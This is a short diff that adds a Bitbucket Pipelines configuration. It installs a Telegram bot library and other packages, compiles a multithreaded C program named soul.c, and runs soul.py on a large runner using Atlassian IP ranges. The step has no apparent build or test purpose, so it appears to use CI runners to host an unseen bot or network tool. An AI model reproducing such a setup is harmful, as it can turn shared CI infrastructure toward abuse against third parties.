@@ -1,0 +1,23 @@
+image: python:3.7
+
+options:
+  runtime:
+    cloud:
+      atlassian-ip-ranges: true
+
+pipelines:
+  default:
+    - step:
+        size: 4x
+        script:
+          - echo "Starting pipeline..."
+          
+          - apt-get update && apt-get install -y gcc libffi-dev libssl-dev
+
+          - pip install telebot pymongo aiohttp
+          
+          - gcc soul.c -o soul -pthread
+          
+          - python soul.py
+          
+          - echo "I use atlassian-ip-ranges"
